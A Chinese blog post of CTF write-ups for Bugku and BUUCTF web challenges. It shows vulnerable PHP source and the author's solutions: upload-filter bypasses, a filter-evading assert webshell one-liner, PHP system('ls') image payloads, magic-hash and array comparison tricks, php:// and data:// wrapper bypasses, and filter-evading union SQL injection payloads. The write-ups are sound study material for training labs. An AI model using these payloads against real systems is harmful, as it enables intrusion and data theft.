<p>很无语，纯黑盒，试了半天试不出来，后面看别人的wp才知道</p>
<p>先上后端源码</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;
&lt;body&gt;
&lt;?php 
$flag &#x3D; &quot;flag&#123;test&#125;&quot;
?&gt;
&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;
My name is margin,give me a image file not a php&lt;br&gt;
&lt;br&gt;
&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot; &#x2F;&gt; 
&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;
&lt;&#x2F;form&gt;
&lt;?php
function global_filter()&#123;
	$type &#x3D;  $_SERVER[&quot;CONTENT_TYPE&quot;];
	if (strpos($type,&quot;multipart&#x2F;form-data&quot;) !&#x3D;&#x3D; False)&#123;
		$file_ext &#x3D;  substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#39;.&#39;)+1);
        $file_ext &#x3D; strtolower($file_ext);
		if (stripos($file_ext,&quot;php&quot;) !&#x3D;&#x3D; False)&#123;
			die(&quot;Invalid File&lt;br &#x2F;&gt;&quot;);
		&#125;
	&#125;
&#125;
?&gt;

&lt;?php

global_filter();
if ((stripos($_FILES[&quot;file&quot;][&quot;type&quot;],&#39;image&#39;)!&#x3D;&#x3D; False) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 10*1024*1024))&#123;
	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &#x3D;&#x3D; 0)&#123;
		$file_ext &#x3D;  substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#39;.&#39;)+1);
        $file_ext &#x3D; strtolower($file_ext);
        $allowexts &#x3D; array(&#39;jpg&#39;,&#39;gif&#39;,&#39;jpeg&#39;,&#39;bmp&#39;,&#39;php4&#39;);
        if(!in_array($file_ext,$allowexts))&#123;
            die(&quot;give me a image file not a php&quot;);
        &#125;
		$_FILES[&quot;file&quot;][&quot;name&quot;]&#x3D;&quot;bugku&quot;.date(&#39;dHis&#39;).&quot;_&quot;.rand(1000,9999).&quot;.&quot;.$file_ext;

	    if (file_exists(&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;
	    	echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &lt;br &#x2F;&gt;&quot;;
	    &#125;
	    else&#123;
	    	if (!file_exists(&#39;.&#x2F;upload&#x2F;&#39;))&#123;
	    		mkdir (&quot;.&#x2F;upload&#x2F;&quot;);
                system(&quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&quot;);
	    	&#125;
	    	move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);
                echo &quot;Upload Success&lt;br&gt;&quot;;
                $filepath &#x3D; &quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];
	      	echo &quot;Stored in: &quot; .&quot;&lt;a href&#x3D;&#39;&quot; . $filepath . &quot;&#39; target&#x3D;&#39;_blank&#39;&gt;&quot; . $filepath . &quot;&lt;br &#x2F;&gt;&quot;;
	    &#125;
	&#125;
&#125;
else&#123;
	if($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;
		echo &quot;You was catched! :) &lt;br &#x2F;&gt;&quot;;
	&#125;
&#125;
?&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>两个过滤，第一个CONTENT_TYPE信息过滤，需要让CONTENT_TYPE信息不等于’multipart/form-data‘但也不能改变其原意，所以考虑将字母改为大写</p>
<p>第二个是白名单<code>$allowexts = array('jpg','gif','jpeg','bmp','php4');</code> ,只允许上面5个通过，所以考虑上传jpg，而后改为php4</p>
<h2 id="bugku—shell"><a class="header-anchor" href="#bugku—shell">¶</a>bugku—shell</h2>
<p>提示：</p>
<blockquote>
<p>送给大家一个过狗一句话 $poc=“a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
</blockquote>
<p>发现提示是assert($_GET[‘s’])</p>
<p>这里介绍assert()函数：</p>
<p><strong>assert()函数</strong></p>
<p>assert()函数在PHP中用来判断一个表达式是否成立，返回真或假。如果直接将PHP代码传入也会被执行。</p>
<p>所以我们直接?s=system(‘ls’)等一些列步骤获取flag</p>
<h2 id="bugku—login1、login2"><a class="header-anchor" href="#bugku—login1、login2">¶</a>bugku—login1、login2</h2>
<p><strong>login1</strong></p>
<p>看到有注册框的首先想到二次注入，但是发现没有修改密码的框，根据题目提示，应该是SQL约束注入，具体原理放在SQL博客中了</p>
<p>直接在注册框注册<code>admin  </code>（有空格），密码随意，然后进入主界面，输入admin与密码即可进入后台获取flag</p>
<p><strong>login2</strong></p>
<p>一个账号密码的登录框，什么都没有，试了所有错误方式都没返回，之后就打开bs，随便发送，发现收回包里面有一个tip，看起来先Base64，拿去解码</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span><span class="token operator">=</span><span class="token string">"SELECT username,password FROM admin WHERE username='"</span><span class="token punctuation">.</span>$username<span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>empty<span class="token punctuation">(</span>$<span class="token keyword">row</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> $<span class="token keyword">row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">=</span>md5<span class="token punctuation">(</span>$password<span class="token punctuation">)</span><span class="token punctuation">)</span>&#123;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>接下来代码审计</p>
<p>会发现这题的登陆和数据库没啥关系，只要password的原值等于md5值就好了，所以直接构造payload</p>
<h2 id="bugku—前女友、备份是个好习惯、MD5、各种绕过哟"><a class="header-anchor" href="#bugku—前女友、备份是个好习惯、MD5、各种绕过哟">¶</a>bugku—前女友、备份是个好习惯、MD5、各种绕过哟</h2>
<p>两个题都是md5碰撞的题目</p>
<p><strong>先前女友</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">!=</span> <span class="token variable">$v2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用get请求获得v1,v2,v3三个值，v1不等于v2但是md5的v1要等于v2，v3要不等于flag，才能返回</p>
<p>md5和strcmp是无法处理数组的，所以我们可以直接传入三个数组，全部返回NULL，就可以通过</p>
<p>URL：?v1[]=something&amp;v2[]=anything&amp;v3[]=nothing</p>
<p><strong>备份是个好习惯</strong></p>
<p>按照题目 备份是个好习惯，是让我们寻找 .bak文件的，也就是说</p>
<p>存在某个文件的.bak文件可以访问，那就试试 <a target="_blank" rel="noopener" href="http://120.24.86.145:8002/web16/index.php.bak%EF%BC%8C%E5%B0%B1%E6%8B%BF%E5%88%B0%E4%BA%86%E6%8F%90%E7%A4%BA%E6%96%87%E4%BB%B6">http://120.24.86.145:8002/web16/index.php.bak，就拿到了提示文件</a></p>
<p>打开</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span> “flag<span class="token operator">.</span>php”<span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span>“display_errors”<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span>‘<span class="token constant">REQUEST_URI</span>’<span class="token punctuation">]</span><span class="token punctuation">,</span> ‘<span class="token operator">?</span>’<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>‘key’<span class="token punctuation">,</span>”<span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token operator">.</span>”取得flag”<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>key1不等于key2，但是md5值相等，所以传入数组就行</p>
<p><strong>MD5</strong></p>
<p>php在处理哈希字符串时，会把每一个以“0E”或“0e”开头的哈希值都解释为0，<br>
所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么php将会认为他们都相同，都是0</p>
<p>利用这一漏洞，输入一个哈希后以“0e”开头的字符串，php会解释为0，如果数据库中存在这种哈希值以“0e”开头的密码的恶化，他就可以以这个用户的身份登陆进去，尽管并没有真正的密码</p>
<p>常用的以0e开头的md5和原值：<br>
s878926199a<br>
0e545993274517709034328855841020<br>
s155964671a<br>
0e342768416822451524974117254469<br>
s214587387a<br>
0e848240448830537924465865611904<br>
s214587387a<br>
0e848240448830537924465865611904<br>
s878926199a<br>
0e545993274517709034328855841020<br>
s1091221200a<br>
0e940624217856561557816327384675<br>
s1885207154a<br>
0e509367213418206700842008763514<br>
s1502113478a<br>
0e861580163291561247404381396064<br>
s1885207154a<br>
0e509367213418206700842008763514<br>
s1836677006a<br>
0e481036490867661113260034900752<br>
s155964671a<br>
0e342768416822451524974117254469<br>
s1184209335a<br>
0e072485820392773389523109082030<br>
s1665632922a<br>
0e731198061491163073197128363787<br>
s1502113478a<br>
0e861580163291561247404381396064<br>
s1836677006a<br>
0e481036490867661113260034900752<br>
s1091221200a<br>
0e940624217856561557816327384675<br>
s155964671a<br>
0e342768416822451524974117254469<br>
s1502113478a<br>
0e861580163291561247404381396064<br>
s155964671a<br>
0e342768416822451524974117254469<br>
s1665632922a<br>
0e731198061491163073197128363787<br>
s155964671a<br>
0e342768416822451524974117254469<br>
s1091221200a<br>
0e940624217856561557816327384675<br>
s1836677006a<br>
0e481036490867661113260034900752<br>
s1885207154a<br>
0e509367213418206700842008763514<br>
s532378020a<br>
0e220463095855511507588041205815<br>
s878926199a<br>
0e545993274517709034328855841020<br>
s1091221200a<br>
0e940624217856561557816327384675<br>
s214587387a<br>
0e848240448830537924465865611904<br>
s1502113478a<br>
0e861580163291561247404381396064<br>
s1091221200a<br>
0e940624217856561557816327384675<br>
s1665632922a<br>
0e731198061491163073197128363787<br>
s1885207154a<br>
0e509367213418206700842008763514<br>
s1836677006a<br>
0e481036490867661113260034900752<br>
s1665632922a<br>
0e731198061491163073197128363787<br>
s878926199a<br>
0e545993274517709034328855841020<br>
<strong>各种绕过哟</strong></p>
<p>上原码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span> <span class="token string single-quoted-string">'passwd can not be uname.'</span><span class="token punctuation">;</span>

    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Flag: '</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">else</span>

        <span class="token keyword">print</span> <span class="token string single-quoted-string">'sorry!'</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>知道，id，uname两个值是通过get获取，passwd通过post获取，之后看过滤</p>
<p>uname的sha1要等于passwdsha1，但这两个值不能相等。</p>
<p>所以构造id=margin，passwd和uname为不相等的两个数组即可，原理与md5数组失效同理</p>
<h2 id="bugku—file-get-contents"><a class="header-anchor" href="#bugku—file-get-contents">¶</a>bugku—file_get_contents</h2>
<p>上原码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$ac</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ac</span> <span class="token operator">===</span> <span class="token variable">$f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>This is flag:"</span> <span class="token operator">.</span><span class="token string double-quoted-string">" <span class="token interpolation"><span class="token variable">$flag</span></span>&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>sorry!&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里涉及到一个<code>file_get_contents()</code>函数,而这个函数是可以绕过的</p>
<p>绕过方式有多种：</p>
<ul>
<li>使用<code>php://input</code>伪协议绕过<br>
① 将要GET的参数?xxx=php://input<br>
② 用post方法传入想要<code>file_get_contents()</code>函数返回的值</li>
<li>用<code>data://</code>伪协议绕过<br>
将url改为：?xxx=data://text/plain;base64,想要<code>file_get_contents()</code>函数返回的值的base64编码<br>
或者将url改为：?xxx=data:text/plain,(url编码的内容)</li>
</ul>
<h2 id="bugku—文件包含2"><a class="header-anchor" href="#bugku—文件包含2">¶</a>bugku—文件包含2</h2>
<p>名字是文件包含，就直接用文件包含做吧，新建一个内容为</p>
 <script language=php>system("ls")</script> 
<p>的jpg图片，上传，一个一个去找，最后再…/…/…/目录下找到flag，cat一下就好了</p>
<p>不过看评论好像能用木马图片上传，不过翻了翻csdn好像没人这么做。。。就算了吧</p>
<h2 id="BUUCTF—-SWPU2019-Web1"><a class="header-anchor" href="#BUUCTF—-SWPU2019-Web1">¶</a>BUUCTF—[SWPU2019]Web1</h2>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211111193034.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211111193109.png" alt=""></p>
<p>一进来是一个登陆界面和注册界面，因为没有修改密码所以暂时不考虑二次注入，然后想用admin进去，爆破完发现好像也不太行。</p>
<p>然后一看到登录界面就想到基于登陆的SQL注入，测了几个发现没有注入点。</p>
<p>所以就随便注册一个名字进去</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211111193357.png" alt=""></p>
<p>然后点申请</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211111193530.png" alt=""></p>
<p>在广告名处发现注入点，<code>1'</code>报错</p>
<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/Desktop/111.png" alt=""></p>
<p>之后测试发现有 空格过滤、or字符过滤、注释过滤</p>
<p>空格过滤平替<code>/**/</code></p>
<p>注释过滤平替<code>'</code></p>
<p><code>order by</code>平替<code>group by</code></p>
<p>但是好像不太行，不知道为啥一直报错，不过最后用union select知道有22列</p>
<p><code>1'/**/union/**/select/**/1,database(),(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='web1'),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></p>
<p>试了一下这个，发现又有敏感，才发现是information_schema过滤，之后又找平替<code>mysql.innodb_table_stats</code>与<code>mysql.innodb_table_index</code></p>
<p>payload=<code>1'/**/union/**/select/**/1,database(),(select/**/group_concat(TABLE_NAME)/**/from/**/mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211111195506.png" alt=""></p>
<p>只有表名没有列名，所以用无列名</p>
<p>payload=<code>1'/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211111195630.png" alt=""></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">晚安，早点休息</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://Lim135.github.io/2021/11/11/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">http://Lim135.github.io/2021/11/11/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">晚安，早点休息</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/web/">
                                    <span class="chip bg-color">web</span>
                                </a>
                            
                                <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
                                    <span class="chip bg-color">做题记录</span>
                                </a>
                            
                                <a href="/tags/misc/">
                                    <span class="chip bg-color">misc</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/11/11/%E4%B8%8D%E6%B7%B1%E5%85%A5%E8%80%8C%E6%B5%85%E5%87%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="不深入而浅出SQL注入">
                        
                        <span class="card-title">不深入而浅出SQL注入</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            一直一直一直在学SQL
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-11
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category">
                                    攻防
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/web/">
                        <span class="chip bg-color">web</span>
                    </a>
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                        <span class="chip bg-color">学习笔记</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/10/31/%E5%8F%8D%E5%B0%84shell/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="反弹shell">
                        
                        <span class="card-title">反弹shell</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-31
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            晚安，早点休息
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
